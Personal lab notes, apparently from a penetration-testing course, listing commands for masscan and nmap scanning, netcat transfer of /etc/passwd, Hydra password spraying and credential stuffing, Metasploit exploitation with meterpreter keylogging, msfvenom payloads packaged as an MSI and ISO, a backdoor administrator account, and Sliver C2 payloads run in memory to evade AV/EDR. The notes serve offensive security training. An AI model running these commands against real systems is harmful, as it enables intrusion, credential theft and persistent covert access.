MASSCAN
=======

Add firewall rule filter packets so OS doesn't send back RST to the scan targets:
sudo iptables -A INPUT -p tcp --dport 55555 -j DROP

Scan command:
sudo masscan --ports 22,23,80,443,8000-9000 --rate 15000 --src-port=55555 -oB /tmp/local.masscan 127.0.0.1

Additional args:
--banners: Instead of sending a RST packet after a SYN-ACK, send an ACK (establish a full connection) and then look at the data sent by the server (such as SSH or SMTP banners)

readscan to convert types:
masscan --readscan ~/labs/masscan_10.130.10.0_24_full.bin -oG /tmp/masscan_10.130.10.0_24_full.gnmap

================================================================================================================================
View packets during network scans using tcpdump:
sudo tcpdump -i tun0 -nn net 10.130.10.0/24
================================================================================================================================

NMAP
====

-n  : disable dns resolution
-sT : scan using a TCP connect (so a full 3-way handshake will be done), if not specified, it will be a "stealth scan"
-sU : perform udp scan
-sV : perform version scanning (based on the probes and regex matching in the file /usr/share/nmap/nmap-service-probes)
-O : performs OS fingerprinting. (this isn't as useful as it was once, best to just not use this)
-A  : perform OS fingerprinting + version scan + script scan with default scripts + traceroute
-F  : Fast scan using top-100 ports
--top-ports : specify top N ports according to nmap
--script=<script-name> : Run nmap script against the ports


Probing options:
-Pn (or -P0): Disable probing that determins if host is up, instead just assume host is alive 
-PE : Send ICMP Echo request (type 8) for probing.
-PP : Send ICMP Timestamp request (ICMP type 13)
-PM : Send ICMP Address Mask Requet (ICMP type 17)
-PR : Use ARP to identify hosts (only works with hosts on same subnet and is used by default if it's the same subnet) and must be root 
-sN or -sP : only probe, not scan afterwards.
-sL option (list scan): don't probe; instead it does reverse dns lookups for the network range and only for those IPs where a pointer record is returned a hostname is received in the DNS request, Nmap then scans the host.

nmap-services file: the file from which Nmap gets its list of most frequent ports to scan, located at: less /usr/share/nmap/nmap-services
nmap-scripts file: head /usr/share/nmap/scripts/script.db


nmap scripts
============

Note: Scripts will not be executed if the appropriate service is not identified by nmap. So if -sV (version scanning) is not done, nmap will rely solely on the nmap-services files and match against the ports to infer the services running. This may result in the script never getting triggered.
Best practice: Always include -sV along with the scripts option so the correct version is identified using probes + nmap service probes file.

ssh-auth-methods : Find out the authentication methods supported for SSH (key vs password or both)


======================================================================================================================================================================================

EyeWitness
==========

/opt/eyewitness/Python/EyeWitness.py --web -x /tmp/webservers.xml (output of nmap -oX)




exfil
=====

Linux -> Windows
nc -nvlp 9999 < /etc/passwd
nc.exe -nv -w 1 LINUX_ETH0_ADDRESS(SRC_IP) 9999


Windows -> Linux
cat C:\CourseFiles\capture.pcap -AsByteStream | nc.exe -nvlp 9999 -w 1


======================================================================================================================================================================================

Hydra

Password spraying (multiple usernames, one or few passwords)

hydra -L /opt/passwords/facebook-f.last-100.txt -p Winter2025! -m workgroup:{hiboxy} 10.130.10.4 smb2

-l: accept a single username
-L: accept a file with a list of usernames
-p: accept a single password
-P: accept a file with a list of passwords
-m workgroup:{hiboxy}: We are connecting to a domain controller and we need to specify the domain (note: you need the {}),
smb2 : the protocol

Once you've found users with password matches, you might try re-gathering BloodHound data as each user to see if you have new administrative permissions, marking them as "owned" inside the BloodHound UI, and reviewing their group memberships to see if they have any additional permissions (such as to internal file shares or applications).

============================================

Command to look at nmap output with ports of interest and extract out only the hosts:

grep 445/open /tmp/smb.gnmap | cut -d' ' -f 2 | tee /tmp/smbservers.txt

.gnmap is the greppable output format of nmap

============================================

Password guessing

hydra -m workgroup:{hiboxy} -l bgreen -p Password1 -M /tmp/smbservers.txt smb2

Why does it look like this account has access to all these Windows systems? Remember, all we are doing is determining if the domain account credentials are valid. This check does NOT check if the user has administrative access to these remote machines. To perform this type of check we need to use a tool, such as Find-LocalAdminAccess from PowerSploit.
https://powersploit.readthedocs.io/en/latest/Recon/Find-LocalAdminAccess/


============================================

Credential stuffing

hydra -C /opt/passwords/hiboxy-breach.txt 10.130.10.4 -m workgroup:{hiboxy} smb2

-C: specify a file with username:password lines


=============================================

List all Active Directory users using a single user's username and password, usign Impact's GetADUsers.py

GetADUsers.py hiboxy.com/bgreen:Password1 -dc-ip 10.130.10.4 -all | tee /tmp/adusers.txt


Extract out only the usernames from the above command's output:

tail -n +6 /tmp/adusers.txt | cut -d ' ' -f 1 | tee /tmp/domainusers.txt

======================================================================================================================================================================================


Metasploit

- Start metasploit on linux:

msfconsole

- List the exploits available:

show exploits

- Search by phrase for an exploit:

search icecast

- Use a particular exploit:

use exploit/windows/http/icecast_header


- Set a payload type (which will determine the kind of reverse connection received):

set PAYLOAD windows/meterpreter/reverse_http

- Show the options related to the current chosen exploit:

show options


- Set options required for an exploit

set RHOSTS WINDOWS_ETHERNET0_ADDRESS

- Launch the attack (after all required options are set)

run


- view all the active meterpreter sessions

sessions


- rename a meterpeter session

sessions -n icecast_win11 -i 1


- Go into a meterpeter session again

sessions -i <id>


- grab a screenshot:

screenshot -p /home/sec560/screenshot.jpg


- get the process id of the current meterpreter session process:

getpid


- Migrate the meterpeter process to a new process:

migrate -N explorer.exe (this will search for the process "explorer.exe and move the current meterpreter into that process)


- start keylogging

keyscan_start


- dump the keylogs collected so far:

keyscan_dump


- stop keylogging

keyscan_stop


- Tell Metasploit that we are going to be launching our payload outside of Metasploit and it should be ready to receive the connection.

use exploit/multi/handler

- set payload to meterpreter

set PAYLOAD windows/meterpreter/reverse_http

- Prevent listener from exiting on receiving a single connection

set ExitOnSession false

- launch the listener running it as a job (-j) and not interacting with new connections (-z).

run -j -z

- list the payload output formats.

msfvenom --list formats

- generate windows meterpreter payload in VBS format

msfvenom -p windows/meterpreter/reverse_http lhost=eth0 lport=3333 -f vbs | tee /tmp/payload.vbs

- generate windows meterpreter payload in MSI format

msfvenom -p windows/meterpreter/reverse_http LHOST=eth0 LPORT=3333 -f msi -o /tmp/setup.msi

- create iso file with some payload content

genisoimage -o /tmp/installer.iso /tmp/setup.msi

=======================================================

Meterpreter

- Put the meterpreter session to background

background (or ctrl-z, bckground is safer though)


- get system info in meterpeter shell

sysinfo


- Get current user id as which meterpreter session process is running

getuid


- list the processes

ps

- get help about the ps command

ps -h

- Find a particular process by name

ps -S Icecast2.exe


- change dictories using absolute path:

cd 'c:\'

- start a cmdline shell from meterpreter:

shell


- (on the windows shell) display the username:

hostname

- (on the windows shell) view the users available:

net user


- (on the windows shell) create a new user on windows:

net user BACKDOOR Password1 /add


- (on the windows shell) get user info:

net user BACKDOOR

- Add the user to administrators group:

net localgroup administrators BACKDOOR /add


- display the group details:

net localgroup administrators

- delete a user:

net user BACKDOOR /del

======================================================================================================================================================================================

Sliver
------

Sliver-server
-------------

- start sliver-server
  sliver-server


Sliver-client
-------------

- import client config to sliver-client:
  sliver-client import /tmp/zerocool_192.168.245.128.cfg 
  
- start sliver-client
  sliver-client


On sliver-server shell:

- enable multiplayer mode
[server] sliver > multiplayer
  
- create a new user (users are called "operators" on Sliver):
[server] sliver > new-operator -n zerocool -s /tmp/ -l 192.168.245.128

  -> here username is zerocool
  -> ip address given is the local ip address, but I suppose for cases where the sliver server is hosted on a different server, we'll have to give the public ip from where we'll connect? (need to validate this)
  
  Note: The config file generated (in /tmp/*.cfg) would be owned by root - because we ran sliver-server using sudo. So change the ownership to your userrname using the command:
  sudo chown sec560:sec560 /tmp/*.cfg


On sliver-client shell:

- start https listener
  https

- generate payload
  generate --os windows --skip-symbols --name first --http <ip-address-of-server>
  
  --skip-symbols: bypass encryption used to generate payload (to speed up generation of payload, ideally always use this)
  --http: I think the arg value can also be a domain (validate this)

- guardrails that we can use to attempt to limit where the payload gets executed
    -w, --limit-datetime: limit execution to before datetime (similar to KillDate in Empire)
    -x, --limit-domainjoined: limit execution to domain joined machines
    -F, --limit-fileexists: limit execution to hosts with this file in the filesystem
    -z, --limit-hostname: limit execution to specified hostname
    -y, --limit-username: limit execution to specified username

- serve the payload generated to the target:
  sudo chmod o+r payload.exe
  python3 -m http.server
  
  -> we need to add the permissions because the file generated would also be having only read permissions to root (since we ran it using sudo), so add permissions to "others" so python can access it probably.
 
- view active sessions
  sessions
  
- switch to use a session
  use <full-session-id-or-partial-session-id-as-long-as-it-is-unique>
  
- Shows the SID of the user and group
   getuid
   getgid
   
- show username
  whoami
  
- the superset of all the above commands, plus gives OS version, build num etc (the most useful):
  info
  
- start a new shell (like powershell/cmd) on the target:
  shell
  
  -> When you run shell you get a notification that this is bad OPSEC. Defensive tools are tuned to look for processes spawning tools commonly used by malicious actors, such as CMD and PowerShell.
  -> To exit out of this shell, just enter exit.
  -> Although, sometimes the exit command doesn't finish in a timely fashion on this latest Windows 11 revision. If you don't see the sliver prompt return after a few seconds, press Ctrl+C to exit sliver, then restart it by re-running sliver-client. Then, interact with the session again using use and the first few characters of the session ID.
  -> On the bright side, since we're not closing down the server, we don't lose the session even if we have to restart the Sliver client.


Sliver execute-assembly
-----------------------

Sliver doesn't have a lot of post-exploitation tools like Metasploit, instead it allows executing assemblies:

> An assembly is a collection of types and resources that are built to work together and form a logical unit of functionality. Assemblies take the form of executable (.exe) or dynamic link library (.dll) files, and are the building blocks of .NET applications. They provide the common language runtime with the information it needs to be aware of type implementations.

- Basically assembly is a ready-to-use executables available on github.
- Sliver will transfer the file and execute it in-memory, so there's no trace of it for AV/EDR systems.


- Execute SharpWMI to see who's logged on
  execute-assembly /home/sec560/labs/SharpWMI.exe action=loggedon

  -> Don't specify the action arg and it will show a list of all supported actions.
